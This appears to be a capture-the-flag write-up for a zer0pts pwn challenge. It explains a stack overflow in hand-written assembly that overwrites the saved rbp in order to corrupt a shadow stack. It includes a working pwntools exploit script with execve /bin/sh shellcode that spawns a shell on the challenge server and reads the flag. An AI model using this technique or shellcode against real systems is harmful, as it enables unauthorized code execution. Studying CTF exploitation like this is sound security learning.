Along with the explanation about how the shadowed stack works, the vulnerability is clearly outlined in the source:

```asm
vuln:
;; char buf[0x100];
  enter 0x100, 0
;; write(1, "Data: ", 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x1000);
  mov edx, 0x1000               ; [!] vulnerability
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return;
  leave
  ret
```

Only `0x100` bytes are allocated for the stack frame, so writing more than that will overwrite `rbp` on the stack (popped during `leave`).

`rbp` is used to set up `buf` in `notvuln` after calling `vuln`:

```asm
notvuln:
;; char buf[0x100];
  enter 0x100, 0
;; vuln();
  call vuln
;; write(1, "Data: ", 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x100);
  mov edx, 0x100
  lea rsi, [rbp-0x100]          ; buffer location
  xor edi, edi
  call read
;; return 0;
  xor eax, eax
  ret
```

This allows the location of the buffer to be read into to be manipulated. This can be used to overwrite the shadow stack so that execution returns to shellcode:

```python3
from pwn import *

#r = process("./chall")
r = remote("pwn.ctf.zer0pts.com", 9011)

# shadow stack base address
retBase = 0x600234

r.recvuntil(": ")
# overwrite rbp to be retBase + 0x100
r.sendline(b"A" * 0x100 + p64(retBase + 0x100))

r.recvuntil(": ")
#gdb.attach(r)

p = b""
p += p64(0) # first return address (unused)
p += p64(retBase + 16) # second return address (jump)

# shellcode
# https://www.exploit-db.com/exploits/47008
p += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
r.sendline(p)

# interactive shell
#r.interactive()

r.sendline("cat flag*")
print(r.recvline().decode().strip())
# zer0pts{1nt3rm3d14t3_pwn3r5_l1k3_2_0v3rwr1t3_s4v3d_RBP}
```
